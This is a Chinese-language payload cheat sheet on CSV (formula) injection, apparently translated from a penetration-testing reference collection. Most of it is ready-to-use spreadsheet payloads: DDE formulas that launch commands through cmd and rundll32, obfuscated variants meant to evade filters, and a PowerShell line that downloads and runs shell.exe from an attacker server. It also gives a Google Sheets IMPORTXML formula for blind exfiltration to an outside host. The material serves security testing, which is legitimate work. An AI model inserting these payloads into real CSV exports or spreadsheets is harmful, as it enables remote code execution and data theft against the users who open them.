[原文文档](README.en.md)

# CSV 注入

> 许多 Web 应用程序允许用户下载内容，如发票模板或用户设置到 CSV 文件。许多用户选择在 Excel、Libre Office 或 Open Office 中打开 CSV 文件。当 Web 应用程序不能正确验证 CSV 文件的内容时，可能会导致一个单元格或许多单元格的内容被执行。

## 摘要

* [方法论](#methodology)
    * [Google 表格](#google-sheets)
* [参考资料](#references)

## 方法论

CSV 注入，也称为公式注入，是一种安全漏洞，当不信任的输入包含在 CSV 文件中时会发生。任何公式都可以以以下字符开头：

```powershell
=
+
–
@
```

使用**动态数据交换**的基本利用。

* 启动计算器

    ```powershell
    DDE ("cmd";"/C calc";"!A0")A0
    @SUM(1+1)*cmd|' /C calc'!A0
    =2+5+cmd|' /C calc'!A0
    =cmd|' /C calc'!'A1'
    ```

* PowerShell 下载并执行

    ```powershell
    =cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
    ```

* 前缀混淆和命令链接

    ```powershell
    =AAAA+BBBB-CCCC&"Hello"/12345&cmd|'/c calc.exe'!A
    =cmd|'/c calc.exe'!A*cmd|'/c calc.exe'!A
    =         cmd|'/c calc.exe'!A
    ```

* 使用 rundll32 代替 cmd

    ```powershell
    =rundll32|'URL.dll,OpenURL calc.exe'!A
    =rundll321234567890abcdefghijklmnopqrstuvwxyz|'URL.dll,OpenURL calc.exe'!A
    ```

* 使用空字符绕过字典过滤器。由于它们不是空格，它们在执行时被忽略。

    ```powershell
    =    C    m D                    |        '/        c       c  al  c      .  e                  x       e  '   !   A
    ```

上述载荷的技术细节：

* `cmd` 是服务器在客户端尝试访问服务器时可以响应的名称
* `/C calc` 是文件名，在我们的例子中是 calc（即 calc.exe）
* `!A0` 是项目名称，指定服务器在客户端请求数据时可以响应的数据单元

### Google 表格

Google 表格允许一些能够获取远程 URL 的额外公式：

* [IMPORTXML](https://support.google.com/docs/answer/3093342?hl=en)(url, xpath_query, locale)
* [IMPORTRANGE](https://support.google.com/docs/answer/3093340)(spreadsheet_url, range_string)
* [IMPORTHTML](https://support.google.com/docs/answer/3093339)(url, query, index)
* [IMPORTFEED](https://support.google.com/docs/answer/3093337)(url, [query], [headers], [num_items])
* [IMPORTDATA](https://support.google.com/docs/answer/3093335)(url)

因此可以使用以下方法测试盲注公式注入或数据泄露的可能性：

```c
=IMPORTXML("http://burp.collaborator.net/csv", "//a/@href")
```

注意：会向用户发出警告，告知公式试图联系外部资源并要求授权。

## 参考资料

* [CSV Excel 宏注入 - Timo Goosen, Albinowax - 2022年6月21日](https://owasp.org/www-community/attacks/CSV_Injection)
* [CSV Excel 公式注入 - Google 漏洞猎人大学 - 2022年5月22日](https://bughunters.google.com/learn/invalid-reports/google-products/4965108570390528/csv-formula-injection)
* [CSV 注入 - 保护 CSV 文件指南 - Akansha Kesharwani - 2017年11月30日](https://payatu.com/csv-injection-basic-to-exploit/)
* [从 CSV 到 Meterpreter - Adam Chester - 2015年11月5日](https://blog.xpnsec.com/from-csv-to-meterpreter/)
* [严重被低估的 CSV 注入危险 - George Mauer - 2017年10月7日](http://georgemauer.net/2017/10/07/csv-injection.html)
* [三种新的 DDE 混淆方法 - ReversingLabs - 2018年9月24日](https://blog.reversinglabs.com/blog/cvs-dde-exploits-and-obfuscation)
* [您的 Excel 表格不安全！这是如何击败 CSV 注入 - we45 - 2020年10月5日](https://www.we45.com/post/your-excel-sheets-are-not-safe-heres-how-to-beat-csv-injection)